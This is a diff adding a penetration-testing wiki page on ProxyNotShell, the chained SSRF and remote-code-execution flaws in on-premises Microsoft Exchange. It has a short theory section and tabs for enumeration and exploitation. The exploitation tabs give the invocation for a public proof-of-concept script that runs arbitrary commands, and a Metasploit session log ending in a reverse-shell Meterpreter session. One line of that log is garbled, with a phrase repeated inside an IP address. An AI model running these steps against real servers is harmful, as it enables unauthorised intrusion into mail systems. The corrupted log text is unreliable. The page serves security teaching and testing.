@@ -1,0 +1,119 @@
+---
+title: "ProxyNotShell"
+description: "Chained CVE-2022-41040, CVE-2022-41082"
+---
+
+## Theory
+
+ProxyNotShell is identified with the following CVEs: CVE-2022–41040 and CVE-2022–41082. The vulnerabilities affect Microsoft Exchange on premises with an **Outlook Web App.**
+
+**CVE-2022-41040** : SSRF\
+This vulnerability allow attackers to send an arbitrary request with a controlled URI and controlled data to an arbitrary backend service with LocalSystem privilege. (Request is very similar to the [ProxyShell](/ad/movement/exchange-services/proxyshell) one)
+
+<Figure src="/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png"><strong>CVE-2022-41040 - SSRF</strong><br /></Figure>
+
+**CVE-2022-41082** : RCE\
+By abusing CVE-2022-41040 **authenticated** users may exploit CVE-2022-41082 to run arbitrary commands in vulnerable Exchange Servers.
+
+<Figure src="/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png"><strong>CVE-2022-41082</strong> - RCE Request</Figure>
+
+## Practice
+
+<Tabs items={['Enumerate', 'Exploit', 'Exploit - Metasploit']}>
+<Tab value="Enumerate">
+
+We can use the [proxynotshell\_checker.nse](https://github.com/CronUp/Vulnerabilidades/blob/main/proxynotshell_checker.nse) nmap script to scan a target
+
+```bash
+nmap -p80,443 --script="proxynotshell_checker.nse" $IP
+
+443/tcp open  https
+    |_proxynotshell_checker: Potentially vulnerable to ProxyNotShell (mitigation not applied).
+```
+
+If we have local access to the target running exchange, we can check it version using the following powershell command:
+
+```powershell
+#Method 1
+PS> GCM exsetup |%{$_.Fileversioninfo}
+
+#Method 2
+PS> (Get-Command ExSetup.exe).FileVersionInfo.ProductVersion
+
+ProductVersion   FileVersion      FileName                                                                             
+--------------   -----------      --------                                                                             
+15.02.0858.005   15.2.1118.20   C:\Program Files\Microsoft\Exchange Server\V15\bin\ExSetup.exe
+```
+
+We can now search for the exact Microsoft Exchange product version using [this microsoft link](https://learn.microsoft.com/fr-fr/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019).\
+\
+Following versions are vulnerable :
+
+| Version            | Vulnerable ProductVersion |
+| ------------------ | ------------------------- |
+| Exchange 2019 CU12 | &lt; 15.2.1118.20            |
+| Exchange 2019 CU11 | &lt; 15.2.986.36             |
+| Exchange 2016 CU23 | &lt; 15.1.2507.16            |
+| Exchange 2016 CU22 | &lt; 15.1.2375.33            |
+| Exchange 2013 CU23 | &lt; 15.0.1497.32            |
+
+<Callout type="info">
+
+All versions before November 8, 2022 are vulnerable
+
+</Callout>
+
+</Tab>
+
+<Tab value="Exploit">
+
+We can use [testanull's python script](https://github.com/testanull/ProxyNotShell-PoC) to exploit this vulnerability
+
+```bash
+# Install dependecies
+pip install requests_ntlm2 requests
+
+#Exploit
+python poc_aug3.py <host> <username> <password> <command>
+```
+
+</Tab>
+
+<Tab value="Exploit - Metasploit">
+
+A Metasploit module is available to exploit ProxyNotShell
+
+<Callout type="info">
+
+This exploit only support Exchange Server 2019
+
+</Callout>
+
+```bash
+msf6 > use exploit/windows/http/exchange_proxynotshell_rce
+
+msf6 exploit(windows/http/exchange_proxynotshell_rce) > set RHOSTS 192.168.159.11
+RHOSTS => 192.168.159.11
+msf6 exploit(windows/http/exchange_proxynotshell_rce) > set USERNAME aliddle
+USERNAME => aliddle
+msf6 exploit(windows/http/exchange_proxynotshell_rce) > set PASSWORD Password1!
+PASSWORD => Password1!
+msf6 exploit(windows/http/exchange_proxynotshell_rce) > exploit
+
+[*] Started reverse TCP handler on 192.168.159.128:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Sending stage (175686 bytes) to 192.168.159.11
+[*] Meterpreter session 1 opened (192.168.159.128:4444 -> 1We can use the We can use the We can use theWe can use the92.168.159.11:7290) at 2022-11-18 17:32:18 -0500
+
+meterpreter > 
+```
+
+</Tab>
+</Tabs>
+
+## Resources
+
+<ResourceCard href="https://www.rezilion.com/blog/proxyshell-or-proxynotshell-lets-set-the-record-straight/" title="www.rezilion.com" description="www.rezilion.com" icon="/assets/favicons/www.rezilion.com.png" />
+
+<ResourceCard href="https://www.picussecurity.com/resource/blog/proxynotshellcve-2022-41040-and-cve-2022-41082-exploits-explained" title="ProxyNotShell: CVE-2022-41040 and CVE-2022-41082 Exploits Explained" description="www.picussecurity.com" icon="/assets/favicons/www.picussecurity.com.png" />
